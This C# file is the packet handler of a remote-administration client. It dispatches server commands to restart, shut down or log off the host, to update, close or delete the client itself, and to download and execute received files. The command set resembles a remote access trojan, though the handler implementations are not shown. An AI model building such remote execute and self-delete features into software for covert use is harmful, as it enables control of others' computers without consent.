using Packets.Commands;
using Packets.Interfaces;
using System;
using System.Diagnostics;

namespace Client.PacketHandler
{
    public class Handler
    {
        public Handler(IPacket packet)
        {
            try
            {
                switch (packet)
                {
                    case PacketComputerRestart packetComputerRestart:
                        {
                            new HandlerComputerOption().Restart();
                            break;
                        }

                    case PacketComputerShutdown packetComputerShutdown:
                        {
                            new HandlerComputerOption().Shutdown();
                            break;
                        }

                    case PacketComputerLogoff packetComputerLogoff:
                        {
                            new HandlerComputerOption().Logoff();
                            break;
                        }

                    case PacketClientUpdate packetClientUpdate:
                        {
                            new HandlerClientOption().Update(packetClientUpdate.fileBytes);
                            break;
                        }

                    case PacketClientClose packetClientClose:
                        {
                            new HandlerClientOption().Close();
                            break;
                        }

                    case PacketClientRestart packetClientRestart:
                        {
                            new HandlerClientOption().Restart();
                            break;
                        }

                    case PacketClientDelete packetClientDelete:
                        {
                            new HandlerClientOption().Delete();
                            break;
                        }

                    case PacketDownloadExecute packetDownloadExecute:
                        {
                            new HandlerDownloadExecute().DownloadExecute(packetDownloadExecute.fileBytes, packetDownloadExecute.fileExtension);
                            break;
                        }

                    case PacketPing packetPing:
                        {
                            // Do something
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
            finally
            {
                GC.Collect();
            }
        }
    }
}
